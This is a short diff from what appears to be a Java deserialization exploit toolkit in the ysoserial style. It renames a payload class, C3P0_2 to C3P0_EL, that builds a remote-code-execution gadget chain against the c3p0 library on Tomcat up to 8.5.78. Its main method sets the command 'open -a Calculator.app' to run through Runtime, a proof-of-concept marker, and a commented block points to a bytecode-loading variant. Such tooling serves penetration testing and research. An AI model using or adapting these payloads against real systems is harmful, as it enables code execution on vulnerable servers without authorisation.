@@ -32,20 +32,20 @@ import java.util.logging.Logger;
 @Dependencies({"com.mchange:c3p0:0.9.5.2", "com.mchange:mchange-commons-java:0.2.11", "org.apache.tomcat:<=8.5.78"})
 @Authors({Authors.MBECHLER})
 @Sink({Sink.C3P0})
-public class C3P0_2 implements ObjectPayload<Object> {
+public class C3P0_EL implements ObjectPayload<Object> {
 
     public static void main(String[] args) throws Exception {
 //        PayloadRunner.run(C3P0.class, args);
 
         // rce
         SinksHelper sinksHelper = new SinksHelper();
-        sinksHelper.setSink(C3P0_2.class.getAnnotation(Sink.class).value()[0]);
+        sinksHelper.setSink(C3P0_EL.class.getAnnotation(Sink.class).value()[0]);
         sinksHelper.setEnchant(EnchantType.Command);
         sinksHelper.setCommandType(EnchantEnums.Runtime);
         sinksHelper.setCommand("open -a Calculator.app");
         JavaClassHelper javaClassHelper = new JavaClassHelper();
         sinksHelper.setJavaClassHelper(javaClassHelper);
-        PayloadRunner.run(C3P0_2.class, args, sinksHelper);
+        PayloadRunner.run(C3P0_EL.class, args, sinksHelper);
 
         // 字节码加载
 //        SinksHelper sinksHelper = new SinksHelper();
